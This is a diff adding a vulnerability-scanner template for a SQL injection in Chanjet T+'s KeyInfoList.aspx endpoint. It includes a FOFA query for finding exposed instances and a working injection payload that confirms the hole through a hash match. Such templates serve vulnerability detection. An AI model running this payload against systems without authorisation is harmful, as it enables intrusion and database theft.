@@ -1,0 +1,30 @@
+id: changjietong-KeyInfoList_aspx-sql
+
+info:
+  name: "畅捷通 T+ KeyInfoList.aspx 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="畅捷通-TPlus"
+      畅捷通T+系统KeyInfoList.aspx接口存在用户输入过滤机制缺失问题。攻击者可通过构造恶意SQL查询实现未经授权的数据访问，包括但不限于敏感凭据泄露（如管理员后台密码、用户个人信息）及数据库结构探测。在特定权限条件下，该漏洞可能被链式利用实现服务器端恶意代码写入，最终导致对目标系统的完全控制。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488229&idx=1&sn=cbfbea3d12dfad4b19e6c89a9c44c3fb&chksm=c267a7d6f5102ec0c41e637d1e627522749e704cc03dae71a26047dcceb8c0cbe78ae19ce5f7&token=350950895&lang=zh_CN#rd
+  tags: 畅捷通T+
+
+
+http:
+- raw:
+  - |
+    GET /tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=')AND+1+IN+(SELECT+sys.fn_varbintohexstr(hashbytes('MD5','123456')))--+ HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'e10adc3949ba59abbe56e057f20f883e'
+
+
+
+
